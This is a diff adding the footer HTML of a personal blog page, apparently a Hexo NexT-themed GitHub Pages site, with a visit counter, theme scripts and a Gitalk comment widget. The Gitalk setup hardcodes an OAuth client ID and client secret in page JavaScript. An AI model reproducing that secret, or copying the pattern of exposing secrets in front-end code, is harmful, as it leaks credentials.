+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
